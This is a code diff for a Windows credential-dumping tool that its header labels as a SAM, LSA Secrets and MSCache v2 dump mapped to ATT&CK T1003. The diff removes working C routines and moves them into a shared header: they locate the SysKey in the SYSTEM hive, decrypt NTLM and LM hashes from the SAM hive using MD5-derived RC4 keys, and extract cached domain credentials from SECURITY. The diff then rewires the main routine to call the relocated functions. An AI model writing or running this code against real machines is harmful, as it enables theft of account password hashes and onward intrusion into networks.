@@ -1,186 +1,7 @@
 // Plan 2 — SAM + LSA Secrets + MSCache v2 Dump (T1003.002/004/005)
 // Raw NTFS volume read → offline hive parse → SysKey decrypt → ADS output
 #include "../shared/common.h"
-
-// SysKey permutation table
-static const BYTE g_SysKeyPerm[16] = {
-    0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07
-};
-
-// ─── Get value from registry hive buffer (vk signature scan) ───
-static BOOL GetRegValue(PBYTE hive, SIZE_T size, PWSTR name, PBYTE* val, PDWORD valSize) {
-    SIZE_T nl = wcslen(name) * 2;
-    for (SIZE_T i = 0; i + nl + 20 < size; i++) {
-        if (*(PWORD)(hive + i) == 0x6B76) { // "vk" signature
-            if (*(PWORD)(hive + i + 2) != nl) continue;
-            if (memcmp(hive + i + 0x14, name, nl) != 0) continue;
-            *valSize = *(PDWORD)(hive + i + 4);
-            DWORD off = *(PDWORD)(hive + i + 8);
-            DWORD abs = 0x1000 + off + 4;
-            if (abs + *valSize <= size) {
-                *val = (PBYTE)malloc(*valSize + 4);
-                if (*val) { memcpy(*val, hive + abs, *valSize); return TRUE; }
-            }
-        }
-    }
-    return FALSE;
-}
-
-// ─── Same as GetRegValue but scoped to a window [start, end) ───
-static BOOL GetRegValueIn(PBYTE hive, SIZE_T size, PWSTR name,
-    SIZE_T start, SIZE_T end, PBYTE* val, PDWORD valSize, PSIZE_T foundAt) {
-    SIZE_T nl = wcslen(name) * 2;
-    if (end > size) end = size;
-    for (SIZE_T i = start; i + nl + 0x18 < end; i++) {
-        if (*(PWORD)(hive + i) != 0x6B76) continue; // "vk" signature
-        if (*(PWORD)(hive + i + 2) != nl) continue;
-        if (memcmp(hive + i + 0x14, name, nl) != 0) continue;
-        DWORD ds = *(PDWORD)(hive + i + 4);
-        DWORD off = *(PDWORD)(hive + i + 8);
-        DWORD abs = 0x1000 + off + 4;
-        if (ds > 0x1000 || abs + ds > size) continue;
-        *val = (PBYTE)malloc(ds + 4);
-        if (!*val) return FALSE;
-        memcpy(*val, hive + abs, ds);
-        *valSize = ds;
-        if (foundAt) *foundAt = i;
-        return TRUE;
-    }
-    return FALSE;
-}
-
-// ─── Extract SysKey from SYSTEM hive ───
-// The four SysKey values (JD, Skew1, GBG, Data) sit together under the Lsa key.
-// Searching the whole file by name alone can hit unrelated values named "Data",
-// so we require all four within a 4KB window after the JD cell.
-static BOOL ExtractSysKey(PBYTE sysData, SIZE_T sysSize, BYTE sysKey[16]) {
-    const WCHAR* vals[] = { L"JD", L"Skew1", L"GBG", L"Data" };
-    SIZE_T nl0 = wcslen(vals[0]) * 2;
-    BYTE raw[16] = {0};
-
-    for (SIZE_T i = 0; i + nl0 + 0x18 < sysSize; i++) {
-        if (*(PWORD)(sysData + i) != 0x6B76) continue;
-        if (*(PWORD)(sysData + i + 2) != nl0) continue;
-        if (memcmp(sysData + i + 0x14, vals[0], nl0) != 0) continue;
-        if (*(PDWORD)(sysData + i + 4) != 4) continue; // JD is exactly 4 bytes
-
-        BOOL ok = TRUE;
-        for (int k = 0; k < 4 && ok; k++) {
-            PBYTE d = NULL; DWORD s = 0;
-            if (!GetRegValueIn(sysData, sysSize, (PWSTR)vals[k], i, i + 4096, &d, &s, NULL)) {
-                ok = FALSE; break;
-            }
-            if (s < 4) { ok = FALSE; free(d); break; }
-            memcpy(raw + k * 4, d, 4);
-            free(d);
-        }
-        if (ok) {
-            for (int k = 0; k < 16; k++) sysKey[k] = raw[g_SysKeyPerm[k]];
-            return TRUE;
-        }
-    }
-
-    // Diagnostics: where is each value, for the next round of debugging
-    for (int k = 0; k < 4; k++) {
-        PBYTE d = NULL; DWORD s = 0; SIZE_T pos = 0;
-        if (GetRegValueIn(sysData, sysSize, (PWSTR)vals[k], 0, sysSize, &d, &s, &pos)) {
-            wprintf(L"      [i] %s: first match at 0x%llX size=%d\n",
-                vals[k], (unsigned long long)pos, s);
-            free(d);
-        } else {
-            wprintf(L"      [i] %s: NOT FOUND\n", vals[k]);
-        }
-    }
-    return FALSE;
-}
-
-// ─── Parse SAM: extract and decrypt NTLM hashes ───
-static DWORD ParseSAM(PBYTE sam, SIZE_T sz, BYTE sysKey[16], NTLM_CRED** out) {
-    DWORD cap = 64, cnt = 0;
-    *out = (NTLM_CRED*)calloc(cap, sizeof(NTLM_CRED));
-    if (!*out) return 0;
-
-    for (SIZE_T i = 0; i + 0xE0 < sz; i++) {
-        if (*(PDWORD)(sam + i) != 0x00000001) continue;
-
-        DWORD ntlmOff = *(PDWORD)(sam + i + 0x0C);
-        DWORD ntlmSize = *(PDWORD)(sam + i + 0x10);
-        DWORD lmOff = *(PDWORD)(sam + i + 0x14);
-
-        if (ntlmSize < 16 || ntlmOff < 0x80 || ntlmOff + 16 > sz) continue;
-
-        // Decrypt: rc4_key = MD5(SysKey || RID_le || "NTPASSWORD\0" || SysKey)
-        BYTE* encBlock = sam + i + ntlmOff;
-        DWORD rid = *(PDWORD)(sam + i + 4);
-
-        BYTE ck[64]; int co = 0;
-        memcpy(ck + co, sysKey, 16); co += 16;
-        ck[co++] = (BYTE)rid; ck[co++] = (BYTE)(rid>>8);
-        ck[co++] = (BYTE)(rid>>16); ck[co++] = (BYTE)(rid>>24);
-        memcpy(ck + co, "NTPASSWORD", 11); co += 11;
-        memcpy(ck + co, sysKey, 16); co += 16;
-
-        BYTE md5Hash[16]; md5(ck, co, md5Hash);
-
-        if (cnt >= cap) { cap *= 2; *out = (NTLM_CRED*)realloc(*out, cap * sizeof(NTLM_CRED)); }
-        NTLM_CRED* c = &(*out)[cnt];
-        rc4(md5Hash, 16, encBlock, 16, c->ntlm);
-
-        // LM hash
-        BYTE ckl[64]; int clo = 0;
-        memcpy(ckl + clo, sysKey, 16); clo += 16;
-        ckl[clo++] = (BYTE)rid; ckl[clo++] = (BYTE)(rid>>8);
-        ckl[clo++] = (BYTE)(rid>>16); ckl[clo++] = (BYTE)(rid>>24);
-        memcpy(ckl + clo, "LMPASSWORD", 11); clo += 11;
-        memcpy(ckl + clo, sysKey, 16); clo += 16;
-        BYTE lmMd5[16]; md5(ckl, clo, lmMd5);
-        rc4(lmMd5, 16, sam + i + lmOff, 16, c->lm);
-
-        c->rid = rid;
-        swprintf_s(c->name, 128, L"User_%d", rid);
-        cnt++;
-        i += 0xE0;
-    }
-    return cnt;
-}
-
-// ─── Parse SECURITY: MSCache v2 entries ───
-static DWORD ParseMSCache(PBYTE sec, SIZE_T sz, WCHAR*** names, WCHAR*** domains, PBYTE** hashes) {
-    DWORD cap = 32, cnt = 0;
-    *names = (WCHAR**)calloc(cap, sizeof(WCHAR*));
-    *domains = (WCHAR**)calloc(cap, sizeof(WCHAR*));
-    *hashes = (PBYTE*)calloc(cap, sizeof(PBYTE));
-    if (!*names || !*domains || !*hashes) return 0;
-
-    WCHAR vn[16];
-    for (int n = 1; n <= 100; n++) {
-        swprintf_s(vn, 16, L"NL$%d", n);
-        PBYTE d = NULL; DWORD s = 0;
-        if (!GetRegValue(sec, sz, vn, &d, &s) || s < 0x70) { if (d) free(d); continue; }
-
-        if (cnt >= cap) {
-            cap *= 2; *names = (WCHAR**)realloc(*names, cap * sizeof(WCHAR*));
-            *domains = (WCHAR**)realloc(*domains, cap * sizeof(WCHAR*));
-            *hashes = (PBYTE*)realloc(*hashes, cap * sizeof(PBYTE));
-        }
-
-        (*hashes)[cnt] = (PBYTE)malloc(16);
-        memcpy((*hashes)[cnt], d + 0x60, 16);
-
-        PWSTR uname = (PWSTR)(d + 0x70);
-        DWORD ul = 0; while (uname[ul] && ul < 127 && (PBYTE)(uname + ul) < d + s) ul++;
-        (*names)[cnt] = (WCHAR*)malloc((ul + 1) * 2);
-        memcpy((*names)[cnt], uname, ul * 2); (*names)[cnt][ul] = 0;
-
-        PWSTR dom = (PWSTR)(d + 0x70 + (ul + 1) * 2);
-        DWORD dl = 0; while (dom[dl] && dl < 127 && (PBYTE)(dom + dl) < d + s) dl++;
-        (*domains)[cnt] = (WCHAR*)malloc((dl + 1) * 2);
-        memcpy((*domains)[cnt], dom, dl * 2); (*domains)[cnt][dl] = 0;
-
-        cnt++; free(d);
-    }
-    return cnt;
-}
+#include "../shared/plan2_sam.h"
 
 // ─── Fallback path: save hives via RegSaveKey (SE_BACKUP_NAME) ───
 // Works on any filesystem (ReFS etc.) where raw NTFS parsing is unavailable.
@@ -324,13 +145,13 @@ int wmain(void) {
     // 4. Extract SysKey
     wprintf(L"[4] Extracting SysKey... ");
     BYTE sysKey[16];
-    if (!ExtractSysKey(sys.data, sys.size, sysKey)) { wprintf(L"FAILED\n"); return 1; }
+    if (!Plan2ExtractSysKey(&sys, sysKey)) { wprintf(L"FAILED\n"); return 1; }
     wprintf(L"OK\n");
 
     // 5. Parse SAM → NTLM hashes
     wprintf(L"[5] Parsing SAM... ");
     NTLM_CRED* creds = NULL;
-    DWORD userCnt = ParseSAM(sam.data, sam.size, sysKey, &creds);
+    DWORD userCnt = Plan2ParseSAM(&sam, sysKey, &creds);
     wprintf(L"%d users\n", userCnt);
 
     // 6. Parse MSCache
@@ -339,7 +160,7 @@ int wmain(void) {
     PBYTE* cacheHashes = NULL;
     if (s2) {
         wprintf(L"[6] Parsing MSCache v2... ");
-        cacheCnt = ParseMSCache(sec.data, sec.size, &cacheNames, &cacheDoms, &cacheHashes);
+        cacheCnt = Plan2ParseMSCache(&sec, &cacheNames, &cacheDoms, &cacheHashes);
         wprintf(L"%d entries\n", cacheCnt);
     } else {
         wprintf(L"[6] MSCache: skipped (no SECURITY hive)\n");
